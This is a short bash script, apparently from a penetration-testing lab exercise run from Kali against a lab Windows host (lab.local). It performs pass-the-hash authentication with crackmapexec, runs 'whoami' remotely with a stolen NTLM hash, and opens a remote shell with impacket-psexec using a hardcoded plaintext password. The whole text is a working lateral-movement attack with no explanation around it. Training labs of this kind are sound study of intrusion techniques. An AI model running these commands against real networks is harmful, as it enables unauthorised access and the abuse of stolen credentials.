#!/usr/bin/env bash
# Exercise 5: pass-the-hash and PSExec. Run from Kali.
# Usage: ./11-lateral-movement.sh <NTLM_HASH>
set -euo pipefail

WS_IP="192.168.1.20"
DOMAIN="lab.local"
USER="jadmin"
PASS="Password123!"
NTLM_HASH="${1:?usage: $0 <NTLM_HASH>}"

crackmapexec smb "$WS_IP" -u "$USER" -H "$NTLM_HASH"
crackmapexec smb "$WS_IP" -u "$USER" -H "$NTLM_HASH" -x "whoami"

impacket-psexec "$DOMAIN/$USER:$PASS@$WS_IP"
